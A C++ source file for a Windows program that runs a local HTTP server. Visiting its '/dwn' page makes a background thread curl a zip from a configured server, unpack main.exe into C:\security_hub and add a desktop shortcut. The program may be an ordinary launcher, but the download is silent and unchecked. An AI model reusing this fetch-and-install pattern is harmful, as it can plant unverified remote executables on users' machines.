#include "../lib/httplib.h"
#include "../include/config.h"
#include "../include/html.h"
#include "../include/func_app.h"
#include "../include/func_shell.h"

#include <iostream>
#include <filesystem>
#include <string>
#include <Windows.h>
#include <shlobj.h>
#include <thread>
#include <future>

typedef const char* (*UnzipFunc)(const char*, const char*);

void start_server(int port) {
    httplib::Server svr;

    auto html_content_ptr = std::make_shared<std::string>(html_content);

    svr.Get("/", [html_content_ptr](const httplib::Request& req, httplib::Response& res) {
        if (html_content_ptr->empty()) {
            res.status = 500;
            res.set_content("Error: Could not read index.html", "text/plain");
        } else {
            res.set_content(*html_content_ptr, "text/html");
        }
    });

    svr.Get("/dwn", [html_content_ptr](const httplib::Request& req, httplib::Response& res) {
        if (html_content_ptr->empty()) {
            res.status = 500;
            res.set_content("Error: Could not read index.html", "text/plain");
        } else {
            res.set_content(html_content_1, "text/html");

            std::thread([]() {
                std::string command = "curl -L -o main.zip " + server;
                const char* command_ = command.c_str();

                runCommandInBackground(command_);

                std::cout << "Команда виконана." << std::endl;

                unzip("main.zip", "C:\\security_hub");

                char path[MAX_PATH];
                HRESULT hr = SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
                if (SUCCEEDED(hr)) {
                    std::wstring shortcutPath = std::wstring(path, path + strlen(path)) + L"\\main.lnk";
                    std::wstring targetPath = L"C:\\security_hub\\main.exe";
                    std::wstring workingDir = L"C:\\security_hub";

                    CreateShortcut(shortcutPath, targetPath, workingDir);

                    std::cout << "Ярлик створено!" << std::endl;
                } else {
                    std::cerr << "Не вдалося отримати шлях до робочого столу." << std::endl;
                }

                deleteFile("./main.zip");

                Sleep(sleep_app);

                exit(1);
            }).detach();
        }
    });

    svr.listen("127.0.0.1", port);
}
